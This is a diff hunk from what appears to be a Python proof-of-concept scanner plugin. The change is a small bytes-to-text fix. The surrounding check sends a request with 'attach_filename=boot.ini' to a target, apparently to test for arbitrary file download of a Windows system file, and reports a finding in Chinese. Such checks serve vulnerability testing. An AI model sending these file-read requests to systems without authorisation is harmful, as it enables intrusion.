@@ -52,7 +52,7 @@ class Poc(ABPoc):
                           '88&attach_filename=boot.ini') % self.target
 
             req = requests.get(verify_url)
-            if req.status_code == 200 and 'boot.ini' in req.content:
+            if req.status_code == 200 and 'boot.ini' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
